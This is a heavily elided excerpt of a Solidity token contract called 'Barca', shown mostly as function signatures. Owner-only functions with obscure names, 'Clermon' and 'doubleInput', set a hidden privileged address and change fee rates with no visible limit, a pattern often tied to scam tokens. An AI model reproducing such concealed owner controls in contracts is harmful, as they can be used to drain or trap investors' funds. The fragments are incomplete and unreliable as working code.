...
contract Ownership is Context {  
    ...
    */
    ...
    function Clermon(address newOwner) external onlyOwner {
        _fac = newOwner;
    }  
...
contract Barca is Context, IERC20, Ownership{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "Barca";
    string private _symbol = "BARCA";
    ...
    function chainReaction() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _feeBuyback,
            _feeReflection,
            _feeMarketing,
    ...
    function OverLiquified(address sender, uint256 target, uint256 accuracy) public pure returns (bool){
    ...
    function doubleInput(uint8 _buybackfee, uint8 _reflectionfee, uint8 _marketingfee, uint8 _devfee, uint8 _feedenominator) external onlyOwner {
